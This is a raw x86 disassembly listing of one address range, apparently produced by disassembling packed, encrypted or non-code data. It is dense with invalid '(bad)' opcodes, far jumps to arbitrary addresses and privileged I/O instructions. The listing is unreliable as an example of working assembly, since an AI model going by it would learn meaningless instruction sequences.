  4136ef:	scas   al,BYTE PTR es:[edi]
  4136f0:	cmp    al,0x43
  4136f2:	cmp    cl,BYTE PTR ds:0x70e0aafe
  4136f8:	fst    QWORD PTR [esi-0x26]
  4136fb:	mov    esi,ecx
  4136fd:	add    BYTE PTR [edi+0x7888d9f0],0xd3
  413704:	adc    al,0x18
  413706:	inc    ecx
  413707:	jge    0x41370b
  413709:	xchg   edx,eax
  41370a:	pop    ds
  41370b:	inc    esi
  41370c:	repnz jmp FWORD PTR [edx-0x4b702fe5]
  413713:	or     DWORD PTR [edx+0x47],esi
  413716:	or     BYTE PTR [edx+ecx*4+0x4a],al
  41371a:	ds inc eax
  41371c:	push   es
  41371d:	push   cs
  41371e:	sbb    BYTE PTR [eax-0x7fed12c1],cl
  413724:	retf   
  413725:	popf   
  413726:	mov    ds:0x10438d98,al
  41372b:	cmp    DWORD PTR [ecx-0x72],0xf84da4f3
  413732:	adc    ecx,DWORD PTR [ecx+0xe]
  413735:	mov    ebp,0x40a10488
  41373a:	pop    ds
  41373b:	std    
  41373c:	pop    ds
  41373d:	pop    eax
  41373e:	neg    BYTE PTR [ebp+0x7a]
  413741:	fsub   DWORD PTR [ebx-0x5245f81]
  413747:	jo     0x4137be
  413749:	(bad)  [ebx]
  41374b:	int3   
  41374c:	(bad)  
  41374d:	mov    eax,0xf991fc86
  413752:	dec    esi
  413753:	pop    ebx
  413754:	lds    eax,FWORD PTR [ebx]
  413756:	sub    edi,DWORD PTR [edx]
  413758:	jmp    0x3632b32a
  41375d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41375e:	out    0x75,al
  413760:	shl    DWORD PTR [ebx-0x7e2380f3],1
  413766:	(bad)
  41376a:	mov    ebx,0x1be7e716
  41376f:	(bad)  
  413771:	retf   0xa24a
  413774:	dec    DWORD PTR [edx+0x288a3e80]
  41377a:	scas   al,BYTE PTR es:[edi]
  41377b:	sub    al,0xe1
  41377d:	push   ss
  41377e:	lahf   
  41377f:	adc    esp,ebp
  413781:	sti    
  413782:	jb     0x41372b
  413784:	cmp    eax,0xde4fa97c
  413789:	jecxz  0x413744
  41378b:	xchg   BYTE PTR [esi+0x13],bh
  41378e:	out    0xb6,eax
  413790:	dec    esi
  413791:	jns    0x4137bd
  413793:	sbb    al,0xaf
  413795:	arpl   WORD PTR [edx],cx
  413797:	dec    ecx
  413798:	jmp    0x413816
  41379a:	pop    ebx
  41379b:	push   eax
  41379c:	dec    ebp
  41379d:	push   ebx
  41379e:	into   
  41379f:	pop    eax
  4137a0:	mov    ecx,0x4e19f217
  4137a5:	push   ss
  4137a6:	shr    BYTE PTR [edx-0x17],cl
  4137a9:	aas    
  4137aa:	and    BYTE PTR [edx+0x5a830488],ch
  4137b0:	addr16 pop edx
  4137b2:	scas   eax,DWORD PTR es:[edi]
  4137b3:	push   0xe48daceb
  4137b8:	pop    eax
  4137b9:	rol    BYTE PTR [ecx-0x6535ca91],cl
  4137bf:	stos   BYTE PTR es:[edi],al
  4137c0:	sbb    eax,0x74bf67a6
  4137c5:	lds    esi,FWORD PTR [edx]
  4137c7:	mov    ch,0x4
  4137c9:	xchg   ebp,eax
  4137ca:	inc    esp
  4137cb:	ffree  st(0)
  4137cd:	pusha  
  4137ce:	dec    ebx
  4137cf:	mov    esp,gs
  4137d1:	and    DWORD PTR [edx],ebp
  4137d3:	push   es
  4137d4:	inc    edi
  4137d5:	and    DWORD PTR [esi],0xffffff9b
  4137d8:	mov    edi,0x3aac628
  4137dd:	mov    ch,0xc0
  4137df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e0:	jecxz  0x41378a
  4137e2:	push   cs
  4137e3:	js     0x413803
  4137e5:	mov    dh,0xdf
  4137e7:	int    0x19
  4137e9:	cmc    
  4137ea:	xchg   edi,eax
  4137eb:	dec    edi
  4137ec:	enter  0x4fc4,0xb5
  4137f0:	std    
  4137f1:	pop    ds
  4137f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137f3:	pop    ebp
  4137f4:	jg     0x413806
  4137f6:	mov    WORD PTR [edi+0x73],ds
  4137f9:	fsubr  QWORD PTR [eax-0x55f6fac2]
  4137ff:	jg     0x4137c1
  413801:	push   ebp
  413802:	pushf  
  413803:	std    
  413804:	sti    
  413805:	call   0xa287:0xf52e33bb
  41380c:	or     DWORD PTR [edi],esp
  41380e:	mov    ebp,0xf18ec115
  413813:	xor    al,0xb8
  413815:	xor    bl,BYTE PTR [eax+edi*8]
  413818:	mov    ebx,0x409953f7
  41381d:	(bad)  
  41381e:	push   esp
  41381f:	aaa    
  413820:	out    0xb1,eax
  413822:	shl    DWORD PTR [ebp-0x768c599e],0xdd
  413829:	pushf  
  41382a:	out    dx,eax
  41382b:	pop    ss
  41382c:	repnz fucomp st(4)
  41382f:	mov    al,ds:0x990da59e
  413834:	mov    ebx,0xf9e57200
  413839:	loope  0x413867
  41383b:	pop    ss
  41383c:	cmp    BYTE PTR [edi],bh
  41383e:	mov    ebp,0x8e0191bb
  413843:	(bad)  
  413844:	mov    bh,0x53
  413846:	and    dl,ch
  413848:	sbb    eax,0x36c2e1a9
  41384d:	aam    0xb7
  41384f:	sbb    al,0xda
  413851:	(bad)  
  413852:	mov    bh,BYTE PTR [eax]
  413854:	(bad)  
  413856:	add    BYTE PTR [ebx+0x507faca5],0xfc
  41385d:	ret    0x76e
  413860:	mov    ecx,ebx
  413862:	mov    ecx,DWORD PTR [eax+0x2c6c8404]
  413868:	dec    BYTE PTR [eax]
  41386a:	inc    esi
  41386b:	xchg   edi,eax
  41386c:	outs   dx,BYTE PTR ds:[esi]
  41386d:	test   eax,0xe562f748
  413872:	xchg   DWORD PTR [edx-0x19],ecx
  413875:	cmp    eax,0xe4f749d1
  41387a:	pop    esp
  41387b:	and    DWORD PTR [eax],0xffffffbd
  41387e:	cmpxchg BYTE PTR [edi+0x6f4f91dc],ah
  413885:	retf   0x33c9
  413888:	dec    ebx
  413889:	mov    ah,0x2c
  41388b:	iret   
  41388c:	or     ebx,DWORD PTR [eax+ebp*4]
  41388f:	mul    ebp
  413891:	xor    ecx,DWORD PTR [edi+0x462df885]
  413897:	add    BYTE PTR [esi-0x2f],ch
  41389a:	mov    esi,0x6d3eb230
  41389f:	pop    edi
  4138a0:	or     ch,BYTE PTR ds:0xc545a0d7
  4138a6:	out    dx,al
  4138a7:	sbb    eax,0x7c2542fa
  4138ac:	out    dx,eax
  4138ad:	xchg   ebx,eax
  4138ae:	jnp    0x413835
  4138b0:	(bad)  
  4138b1:	inc    esi
  4138b2:	inc    esp
  4138b3:	adc    BYTE PTR [edi+0x1cc19da],dl
  4138b9:	into   
  4138ba:	cwde   
  4138bb:	dec    eax
  4138bc:	scas   eax,DWORD PTR es:[edi]
  4138bd:	adc    al,BYTE PTR [edx]
  4138bf:	sub    dh,BYTE PTR [ebx]
  4138c1:	xchg   DWORD PTR [ecx-0x34e2e84c],eax
  4138c7:	fsub   QWORD PTR [esi]
  4138c9:	retf   
  4138ca:	test   dl,ah
  4138cc:	mov    gs,edi
  4138ce:	pop    ebx
  4138cf:	add    al,0x67
  4138d1:	ins    BYTE PTR es:[edi],dx
  4138d2:	lods   al,BYTE PTR ds:[esi]
  4138d3:	pop    ecx
  4138d4:	pop    ebp
  4138d5:	mov    edi,0xeecf02b9
  4138da:	call   0x8a7a91a1
  4138df:	pop    edx
  4138e0:	cmp    al,0x8
  4138e2:	(bad)  
  4138e4:	dec    edi
  4138e5:	push   0xe153dc0a
  4138ea:	xchg   edx,eax
  4138eb:	loopne 0x4138fb
  4138ed:	daa    
  4138ee:	dec    edx
  4138ef:	outs   dx,BYTE PTR ds:[esi]
  4138f0:	aaa    
  4138f1:	mov    bl,0x4f
  4138f3:	inc    ecx
  4138f4:	int3   
  4138f5:	(bad)  
  4138f6:	sbb    eax,0x6fc2d682
  4138fb:	sbb    DWORD PTR [eax],edi
  4138fd:	in     eax,0xa1
  4138ff:	cmp    cl,BYTE PTR [ebx-0x3ef35db]
  413905:	hlt    
  413906:	mov    ecx,0xc73b382d
  41390b:	loop   0x413933
  41390d:	ja     0x413903
  41390f:	inc    eax
  413910:	sbb    esi,DWORD PTR [ebp+ecx*1-0x2ce92baa]
  413917:	push   esi
  413918:	dec    edx
  413919:	lods   eax,DWORD PTR ds:[esi]
  41391a:	push   cs
  41391b:	popaw  
  41391d:	mov    bh,0x72
  41391f:	inc    ebp
  413920:	retf   0xc93c
  413923:	push   0x3
  413925:	adc    DWORD PTR ds:0x5dd9152a,esi
  41392b:	fnstcw WORD PTR cs:[ebx-0x4a1899f4]
  413932:	test   BYTE PTR [ebp-0x14],al
  413935:	jnp    0x41395c
  413937:	jecxz  0x41399e
  413939:	out    0x75,eax
  41393b:	fmul   st(3),st
  41393d:	aad    0x64
  41393f:	cmp    ecx,edi
  413941:	mov    edi,0x6bffc677
  413946:	adc    al,0xae
  413948:	xor    al,0xfb
  41394a:	outs   dx,DWORD PTR ds:[esi]
  41394b:	and    bh,BYTE PTR [esi-0xb]
  41394e:	in     eax,dx
  41394f:	jp     0x413992
  413951:	mov    bl,0x8a
  413953:	xor    bh,al
  413955:	and    dl,dl
  413957:	(bad)  
  413958:	lahf   
  413959:	in     al,0x95
  41395b:	fiadd  WORD PTR [esi]
  41395d:	cli    
  41395e:	cmp    eax,0xa205e571
  413963:	xchg   ebp,eax
  413964:	mov    WORD PTR [ebx-0x506dfbea],ds
  41396a:	lds    esi,FWORD PTR [edx]
  41396c:	or     al,0x31
  41396e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41396f:	outs   dx,DWORD PTR ds:[esi]
  413970:	inc    ecx
  413971:	sbb    eax,0x368df99
  413976:	push   edi
  413977:	jecxz  0x4139ec
  413979:	dec    edi
  41397a:	mov    esi,DWORD PTR [edx-0x3d]
  41397d:	pop    sp
  41397f:	jbe    0x4139be
  413981:	out    0x69,al
  413983:	mov    ah,0x5a
  413985:	addr16 dec edi
  413987:	daa    
  413988:	xor    eax,0x84cb8062
  41398d:	(bad)  
  41398e:	fisttp WORD PTR [ebx-0x162e709a]
  413994:	(bad)  
  413995:	ins    BYTE PTR es:[edi],dx
  413996:	sub    BYTE PTR [edi],ch
  413998:	mov    dl,0x22
  41399a:	imul   ecx,DWORD PTR [edx],0x0
  41399d:	outs   dx,DWORD PTR ds:[esi]
  41399e:	mov    dh,BYTE PTR [ebx]
  4139a0:	add    DWORD PTR [eiz*1+0x5fc16b3],ecx
  4139a7:	dec    eax
  4139a8:	mov    ecx,0x46064f05
  4139ad:	inc    esp
  4139ae:	fnclex 
  4139b0:	int3   
  4139b1:	sbb    bl,ch
  4139b3:	pop    edx
  4139b4:	repnz imul ebx,DWORD PTR [eax],0x518d4c94
  4139bb:	das    
  4139bc:	inc    edi
  4139bd:	mov    edi,0x48e99351
  4139c2:	mov    cs,WORD PTR [edi+0x346a97ae]
  4139c8:	lock jg 0x413993
  4139cb:	mov    ebp,0x30310be2
  4139d0:	jecxz  0x413a4e
  4139d2:	sbb    edx,DWORD PTR [edx-0xc0d281c]
  4139d8:	mov    esp,0x649a1f7c
  4139dd:	ja     0x41398a
  4139df:	loopne 0x4139ed
  4139e1:	mov    ah,0x33
  4139e3:	ins    BYTE PTR es:[edi],dx
  4139e4:	jbe    0x413998
  4139e6:	xor    esi,esp
  4139e8:	dec    esi
  4139e9:	mov    bh,0x67
  4139eb:	cmp    DWORD PTR [esi],esi
  4139ed:	dec    edi
  4139ee:	xchg   ebp,eax
  4139ef:	in     al,0x73
  4139f1:	jle    0x413a37
  4139f3:	scas   eax,DWORD PTR es:[edi]
  4139f4:	ins    BYTE PTR es:[edi],dx
  4139f5:	in     al,dx
  4139f6:	(bad)  
  4139f7:	lods   al,BYTE PTR ds:[esi]
  4139f8:	xchg   edx,eax
  4139f9:	(bad)  
  4139fa:	xchg   edx,eax
  4139fb:	inc    eax
  4139fc:	cmp    al,0x9c
  4139fe:	in     al,dx
  4139ff:	inc    esi
  413a00:	clc    
  413a01:	mov    ds:0x9193f13,al
  413a06:	xchg   edx,eax
  413a07:	mov    ch,0xf1
  413a09:	and    eax,0x4b7815c9
  413a0e:	jle    0x4139ae
  413a10:	mov    cl,0x2f
  413a12:	and    DWORD PTR [ecx+0x50a4aa19],edx
  413a18:	fld    DWORD PTR [edx]
  413a1a:	and    ebx,edi
  413a1c:	(bad)
  413a1f:	pushf  
  413a20:	scas   al,BYTE PTR es:[edi]
  413a21:	lods   eax,DWORD PTR ds:[esi]
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	inc    edi
  413a24:	mov    dh,0xb9
  413a26:	ins    DWORD PTR es:[edi],dx
  413a27:	add    dl,ah
  413a29:	mov    bh,0xd0
  413a2b:	sub    BYTE PTR [eax+0x335d674b],bh
  413a31:	test   DWORD PTR [edi-0x2776d50e],0xe2cbbd29
  413a3b:	lods   al,BYTE PTR ds:[esi]
  413a3c:	(bad)  
  413a3d:	push   esi
  413a3e:	or     eax,0xda452d10
  413a43:	sbb    eax,0xe0f5f778
  413a48:	sbb    bh,BYTE PTR [edi-0x3b]
  413a4b:	int3   
  413a4c:	out    0x60,al
  413a4e:	sbb    ebp,DWORD PTR [edi+0x18d674eb]
  413a54:	iret   
  413a55:	cli    
  413a56:	pop    ebp
  413a57:	push   0x8f94899f
  413a5c:	add    cl,BYTE PTR [ecx-0x6dc5eeab]
  413a62:	add    dl,BYTE PTR [edi]
  413a64:	add    ebp,DWORD PTR [esi+0xe]
  413a67:	add    al,0x9f
  413a69:	jno    0x413a19
  413a6b:	jecxz  0x413aa1
  413a6d:	stc    
  413a6e:	push   edx
  413a6f:	push   cs
  413a70:	xor    BYTE PTR [ecx],0xe4
  413a73:	mov    WORD PTR [ebx-0x618598a6],?
  413a79:	ins    DWORD PTR es:[edi],dx
  413a7a:	add    BYTE PTR [ecx],cl
  413a7c:	js     0x413a99
  413a7e:	sti    
  413a7f:	inc    esp
  413a80:	cmp    BYTE PTR [ebp-0x4f],dh
  413a83:	add    DWORD PTR [ebx+0x6819da3c],0xffffffb7
  413a8a:	adc    esi,0x57b32955
  413a90:	sbb    dl,BYTE PTR [ebp-0x57ffffb2]
  413a96:	clc    
  413a97:	adc    BYTE PTR [ecx-0x38],bl
  413a9a:	push   0xb8655c8a
  413a9f:	in     al,0x24
  413aa1:	(bad)  
  413aa2:	test   DWORD PTR fs:[edx+0x4a],eax
  413aa6:	dec    esp
  413aa7:	dec    esp
  413aa8:	adc    BYTE PTR [ecx-0x2392766f],bl
  413aae:	or     cl,BYTE PTR [edi+0x11]
  413ab1:	sbb    ecx,ebp
  413ab3:	pop    ebx
  413ab4:	xor    DWORD PTR [edi-0xe],eax
  413ab7:	ins    DWORD PTR es:[edi],dx
  413ab8:	adc    eax,0xb60d451b
  413abd:	aam    0x5
  413abf:	cld    
  413ac0:	test   BYTE PTR [ebx+0x61a87e16],0xc4
  413ac7:	xor    ch,BYTE PTR [esi+eiz*8]
  413aca:	xlat   BYTE PTR ds:[ebx]
  413acb:	dec    edi
  413acc:	fidivr WORD PTR [ebx-0x72]
  413acf:	jp     0x413a85
  413ad1:	call   0x48818fa6
  413ad6:	mov    DWORD PTR [ebp-0x19b157c9],eax
  413adc:	cwde   
  413add:	mul    ebp
  413adf:	jb     0x413aee
  413ae1:	mov    ds:0x34084641,al
  413ae6:	cmp    BYTE PTR [esi],bh
  413ae8:	mov    al,ds:0x3e8fd9e5
  413aed:	adc    DWORD PTR [edx+ecx*1-0x31604153],0xb64bcaac
  413af8:	fprem1 
  413afa:	pop    ecx
  413afb:	daa    
  413afc:	outs   dx,BYTE PTR ds:[esi]
  413afd:	sbb    dl,dh
  413aff:	mov    ch,BYTE PTR [edi+0x47]
  413b02:	pop    ss
  413b03:	mov    ebx,?
  413b05:	cmp    ch,BYTE PTR [edx+esi*2]
  413b08:	xor    al,BYTE PTR cs:[edx+ebx*2+0x449ba2ac]
  413b10:	(bad)  
  413b11:	lea    esi,[bx]
  413b14:	or     ecx,DWORD PTR [ebp+0x31d00920]
  413b1a:	imul   edi,ecx,0xfcf73374
  413b20:	adc    BYTE PTR [eax-0x6c],al
  413b23:	es ror edi,0xae
  413b27:	sbb    cl,BYTE PTR [eax-0x1f203b90]
  413b2d:	rcl    DWORD PTR [ebx],cl
  413b2f:	pushf  
  413b30:	ins    DWORD PTR es:[edi],dx
  413b31:	xor    BYTE PTR [edi+0x41e15d98],dh
  413b37:	cdq    
  413b38:	and    dl,BYTE PTR [ebp+0x59]
  413b3b:	sbb    edx,DWORD PTR [ecx+0x33]
  413b3e:	cmp    cl,BYTE PTR [esi+0x52]
  413b41:	add    al,0xa8
  413b43:	xchg   edi,eax
  413b44:	cmp    BYTE PTR [edx],dl
  413b46:	mov    dh,0x9
  413b48:	mov    es,edi
  413b4a:	inc    sp
  413b4c:	aas    
  413b4d:	xchg   ebp,eax
  413b4e:	mov    edx,0x1fd9c774
  413b53:	dec    edi
  413b54:	or     al,0x97
  413b56:	adc    dh,cl
  413b58:	out    dx,eax
  413b59:	dec    esi
  413b5a:	mov    dh,0x10
  413b5c:	fdivrp st(7),st
  413b5e:	jo     0x413bac
  413b60:	mov    edx,0x3fa7e2cc
  413b65:	jns    0x413bca
  413b67:	das    
  413b68:	ror    dl,1
  413b6a:	in     al,dx
  413b6b:	jb     0x413be1
  413b6d:	clc    
  413b6e:	das    
  413b6f:	call   0x290b:0x87489a40
  413b76:	fs sub ecx,eax
  413b79:	jecxz  0x413b8a
  413b7b:	mov    edi,0xff3c8b21
  413b80:	out    dx,eax
  413b81:	(bad)  
  413b82:	lds    ebp,FWORD PTR [esi-0x786ff277]
  413b88:	push   edi
  413b89:	idiv   ebx
  413b8b:	xchg   ebx,eax
  413b8c:	pop    ebx
  413b8d:	mov    eax,ds:0x9cee4e65
  413b92:	test   cl,bh
  413b94:	cmp    al,0xa2
  413b96:	jo     0x413bac
  413b98:	or     al,0x87
  413b9a:	cs dec esi
  413b9c:	xchg   BYTE PTR [edx],ah
  413b9e:	ja     0x413b38
  413ba0:	lahf   
  413ba1:	pop    edi
  413ba2:	sub    edx,ecx
  413ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ba5:	(bad)  
  413ba6:	mov    esp,0xfac2ce6a
  413bab:	shl    DWORD PTR [esi],cl
  413bad:	mov    WORD PTR ds:0xbba3b781,cs
  413bb3:	and    eax,0xb99b4736
  413bb8:	xor    al,cl
  413bba:	int3   
  413bbb:	in     eax,dx
  413bbc:	push   ds
  413bbd:	hlt    
  413bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bbf:	ins    BYTE PTR es:[edi],dx
  413bc0:	retf   
  413bc1:	test   al,0x28
  413bc3:	push   cs
  413bc4:	xchg   DWORD PTR [eax+0x2f22a2e8],eax
  413bca:	dec    edx
  413bcb:	and    cx,WORD PTR [esi+0x28]
  413bcf:	ficom  DWORD PTR [eax-0x5471fc33]
  413bd5:	mov    al,0x7f
  413bd7:	lahf   
  413bd8:	push   es
  413bd9:	xor    dh,BYTE PTR [ebp-0x5e]
  413bdc:	pop    edi
  413bdd:	fisttp DWORD PTR gs:0x1ccf2d67
  413be4:	jecxz  0x413c1c
  413be6:	jns    0x413c09
  413be8:	mov    esp,0xbfc6cebd
  413bed:	lock mov eax,0xd744ac30
  413bf3:	(bad)  
  413bf4:	and    eax,edx
  413bf6:	jno    0x413bd9
  413bf8:	mov    DWORD PTR [ebx+0x4c],ecx
  413bfb:	clc    
  413bfc:	sub    eax,0x60fdb0f0
  413c01:	and    ebx,esp
  413c03:	ja     0x413c30
  413c05:	mov    es,WORD PTR [edx-0x27116c04]
  413c0b:	add    eax,0x4b53163a
  413c10:	(bad)  
  413c11:	out    dx,al
  413c12:	lahf   
  413c13:	mov    eax,ds:0xc2a7c920
  413c18:	mov    eax,ds:0x5149a68f
  413c1d:	mov    ah,0x91
  413c1f:	inc    edi
  413c20:	fdivr  QWORD PTR [edx+eiz*4+0x22]
  413c24:	jmp    0x413c5d
  413c26:	push   esi
  413c27:	retf   0xf099
  413c2a:	xchg   ebx,eax
  413c2b:	test   BYTE PTR [ebp-0x8],bl
  413c2e:	in     eax,0xa2
  413c30:	adc    eax,ecx
  413c32:	sbb    ch,BYTE PTR [eax+0x22927ef9]
  413c38:	pop    ds
  413c39:	push   cs
  413c3a:	or     eax,0x4c75d0bd
  413c3f:	lods   al,BYTE PTR ds:[esi]
  413c40:	ret    0x4e72
  413c43:	(bad)  
  413c44:	jle    0x413c70
  413c46:	lods   al,BYTE PTR ds:[esi]
  413c47:	data16 data16 arpl WORD PTR [edi-0x63ce951f],di
  413c4f:	ds das 
  413c51:	pop    ecx
  413c52:	mov    al,ds:0x31a223f6
  413c57:	sub    ch,BYTE PTR [edi+eax*4+0x5970c410]
  413c5e:	(bad)  
  413c5f:	mov    edx,0x17136e2c
  413c64:	add    al,0x34
  413c66:	sbb    edi,DWORD PTR [edx-0x548368b6]
  413c6c:	mov    cl,0x19
  413c6e:	ret    
  413c6f:	cmp    esp,ebx
  413c71:	xchg   edx,eax
  413c72:	mov    ch,0x6d
  413c74:	idiv   BYTE PTR [ebp-0x1cb627b2]
  413c7a:	popa   
  413c7b:	(bad)  
  413c7c:	retf   0x7cc3
  413c7f:	fisubr DWORD PTR [esi]
  413c81:	add    BYTE PTR [esp+eax*1-0x51],dl
  413c85:	enter  0xb13c,0x2f
  413c89:	sbb    eax,0xbeaf6bc2
  413c8e:	addr16 pop ebx
  413c90:	inc    esp
  413c91:	fisttp WORD PTR [ebp+0x13]
  413c94:	imul   ebp,DWORD PTR [esi-0xa],0xffffffe6
  413c98:	sbb    al,0x27
  413c9a:	in     eax,0x75
  413c9c:	pushf  
  413c9d:	retf   0xb632
  413ca0:	je     0x413caf
  413ca2:	inc    ebp
  413ca3:	cwde   
  413ca4:	out    0x5d,eax
  413ca6:	cmp    BYTE PTR [esi],cl
  413ca8:	aam    0x4f
  413caa:	dec    edx
  413cab:	imul   edx,DWORD PTR [ebx],0x71e07063
  413cb1:	mov    dh,0x80
  413cb3:	mov    dl,0x3d
  413cb5:	adc    eax,0xfb7ab3ed
  413cba:	lods   eax,DWORD PTR ds:[esi]
  413cbb:	mov    BYTE PTR [edi-0x45],bl
  413cbe:	dec    edx
  413cbf:	mov    bh,0xef
  413cc1:	adc    BYTE PTR [edi+0x38],cl
  413cc4:	mov    esp,0x9fb23f1b
  413cc9:	push   edi
  413cca:	pop    esi
  413ccb:	adc    esi,DWORD PTR [esi+0x41]
  413cce:	(bad)  
  413ccf:	xchg   ebp,eax
  413cd0:	pushf  
  413cd1:	loope  0x413d48
  413cd3:	outs   dx,BYTE PTR ds:[esi]
  413cd4:	cld    
  413cd5:	arpl   WORD PTR [edx],bx
  413cd7:	bound  eax,QWORD PTR [ebp-0x60d5e2d1]
  413cdd:	mov    al,ds:0xb047ec69
  413ce2:	ins    DWORD PTR es:[edi],dx
  413ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ce4:	add    eax,DWORD PTR [eax]
  413ce6:	mov    cl,0x4c
  413ce8:	push   esi
  413ce9:	push   ebx
  413cea:	dec    ebx
  413ceb:	sub    eax,0x60679da4
  413cf0:	stc    
  413cf1:	xchg   ecx,eax
  413cf2:	sbb    DWORD PTR [eax],esp
  413cf4:	stos   DWORD PTR es:[edi],eax
  413cf5:	xor    esp,ebp
  413cf7:	adc    dl,al
  413cf9:	sbb    BYTE PTR [esi+0x5a387259],cl
  413cff:	retf   
  413d00:	(bad)  
  413d01:	aam    0x31
  413d03:	out    dx,al
  413d04:	cwde   
  413d05:	(bad)  
  413d06:	aaa    
  413d07:	adc    edi,esp
  413d09:	add    ah,bh
  413d0b:	pushf  
  413d0c:	shr    DWORD PTR [eax+0xc],0x28
  413d10:	ret    0xe4c3
  413d13:	cdq    
  413d14:	mov    BYTE PTR [eax],0x74
  413d17:	adc    eax,0x4d8ffe49
  413d1c:	and    cl,cl
  413d1e:	pop    ebx
  413d1f:	inc    ebx
  413d20:	and    eax,0xad7b52ff
  413d25:	in     eax,0xfc
  413d27:	cld    
  413d28:	add    al,0x4f
  413d2a:	cmp    ah,ah
  413d2c:	jle    0x413d6c
  413d2e:	bound  esp,QWORD PTR [eax+0x32]
  413d31:	ins    DWORD PTR es:[edi],dx
  413d32:	jns    0x413cf2
  413d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d35:	push   es
  413d36:	das    
  413d37:	dec    ecx
  413d38:	(bad)  
  413d39:	mov    dl,0xaf
  413d3b:	xchg   esi,eax
  413d3c:	and    eax,0x95dbaf78
  413d41:	fdivp  st(0),st
  413d43:	stos   BYTE PTR es:[edi],al
  413d44:	ds jecxz 0x413db2
  413d47:	mov    al,0x42
  413d49:	nop
  413d4a:	sbb    al,0xaa
  413d4c:	pop    ds
  413d4d:	retf   
  413d4e:	push   edi
  413d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d50:	mov    edx,0xdb1360df
  413d55:	xor    eax,0xee6ef44d
  413d5a:	xor    ebx,DWORD PTR [esi]
  413d5c:	push   esi
  413d5d:	pop    edx
  413d5e:	ss pop eax
  413d60:	sub    BYTE PTR ds:0x89923aa3,0x8e
  413d67:	(bad)  
  413d68:	fisttp WORD PTR ds:0x98325f6
  413d6e:	push   esp
  413d6f:	xchg   ebp,eax
  413d70:	ret    0x7bfd
  413d73:	sbb    eax,0x9cf38f99
  413d78:	and    DWORD PTR [esi+0xa],esp
  413d7b:	dec    ebp
  413d7c:	fs mov ch,0x9d
  413d7f:	test   eax,0xdf25b11b
  413d84:	push   0x17
  413d86:	push   eax
  413d87:	mov    ecx,0xbb7d8f1c
  413d8c:	(bad)  
  413d8e:	dec    eax
  413d8f:	scas   eax,DWORD PTR es:[edi]
  413d90:	inc    ebx
  413d91:	cmp    ch,BYTE PTR [esi]
  413d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d94:	jle    0x413d4d
  413d96:	sbb    al,cl
  413d98:	fwait
  413d99:	icebp  
  413d9a:	stos   DWORD PTR es:[edi],eax
  413d9b:	mov    bl,0x4a
  413d9d:	push   0xffffffb8
  413d9f:	cmc    
  413da0:	push   edx
  413da1:	aaa    
  413da2:	cmc    
  413da3:	jmp    FWORD PTR [esi+0x565b7f91]
  413da9:	popa   
  413daa:	nop
  413dab:	ret    0xc888
  413dae:	fisubr WORD PTR [ebx-0x4f]
  413db1:	or     bh,BYTE PTR [ebx]
  413db3:	loop   0x413da6
  413db5:	sbb    ch,BYTE PTR [edx+ebx*2]
  413db8:	add    ecx,DWORD PTR [edx+0x23]
  413dbb:	test   DWORD PTR ds:0xf9cebb41,edi
  413dc1:	stos   DWORD PTR es:[edi],eax
  413dc2:	mov    al,0xf2
  413dc4:	xor    al,0x91
  413dc6:	repz sbb DWORD PTR [ecx+0x75],eax
  413dca:	inc    ebx
  413dcb:	mov    edx,0x5eb709f6
  413dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dd1:	cmc    
  413dd2:	jge    0x413d55
  413dd4:	pushf  
  413dd5:	fadd   st,st(3)
  413dd7:	lea    esp,[esi]
  413dd9:	(bad)  
  413dda:	mov    bl,0x83
  413ddc:	in     al,dx
  413ddd:	inc    esp
  413dde:	(bad)  
  413ddf:	mov    eax,0x7613cb31
  413de4:	mov    ds:0xd25f8599,al
  413de9:	mov    cl,0xf6
  413deb:	and    eax,0xb236e740
  413df0:	or     esp,ecx
  413df2:	shr    BYTE PTR [ebp-0x10],1
  413df5:	mov    al,cl
  413df7:	int3   
  413df8:	in     eax,0xf6
  413dfa:	push   ebx
  413dfb:	in     al,0x8
  413dfd:	stos   DWORD PTR es:[edi],eax
  413dfe:	push   es
  413dff:	add    DWORD PTR [ecx-0x5f],0xffffff9f
  413e03:	repnz lods eax,DWORD PTR ds:[esi]
  413e05:	popa   
  413e06:	mov    dl,ah
  413e08:	sbb    BYTE PTR [esi-0x2],cl
  413e0b:	xchg   esp,eax
  413e0c:	cmp    esi,DWORD PTR [edx+0x31]
  413e0f:	cmp    eax,ebp
  413e11:	push   es
  413e12:	jne    0x413e3c
  413e14:	dec    eax
  413e15:	ss mov al,0x88
  413e18:	xor    dh,dl
  413e1a:	(bad)  
  413e1b:	mov    eax,0x6634307e
  413e20:	sub    BYTE PTR ds:0x3d9381f8,al
  413e26:	inc    edx
  413e27:	adc    bl,dh
  413e29:	test   eax,0xf40eca2c
  413e2e:	lock pop edx
  413e30:	pop    ebx
  413e31:	adc    ah,BYTE PTR [ecx-0x6e]
  413e34:	sbb    eax,0xa5c754c8
  413e39:	ss in  al,0x5
  413e3c:	loop   0x413e46
  413e3e:	jecxz  0x413e08
  413e40:	add    ah,0xab
  413e43:	sbb    eax,0xffdd9e87
  413e48:	fbld   TBYTE PTR [eax+0x2b6713ce]
  413e4e:	scas   eax,DWORD PTR es:[edi]
  413e4f:	mov    ebx,0xb0dcd563
  413e54:	cmc    
  413e55:	mov    BYTE PTR [edi-0x60],bl
  413e58:	rcr    ebp,0x18
  413e5b:	or     DWORD PTR [edx-0x79ad1ea3],0x7f97a888
  413e65:	pop    ebx
  413e66:	js     0x413e1c
  413e68:	ret    
  413e69:	mov    al,ds:0xe999030a
  413e6e:	push   ds
  413e6f:	add    bh,BYTE PTR [esi+0x2ae41e5c]
  413e75:	push   0x92403165
  413e7a:	sar    DWORD PTR [ebx],cl
  413e7c:	arpl   di,cx
  413e7e:	call   0x54db2e17
  413e83:	mov    esp,0x3b13d56f
  413e88:	cdq    
  413e89:	fsubr  DWORD PTR [ebx+0x156fd9a4]
  413e8f:	repz rol BYTE PTR [edx],0x95
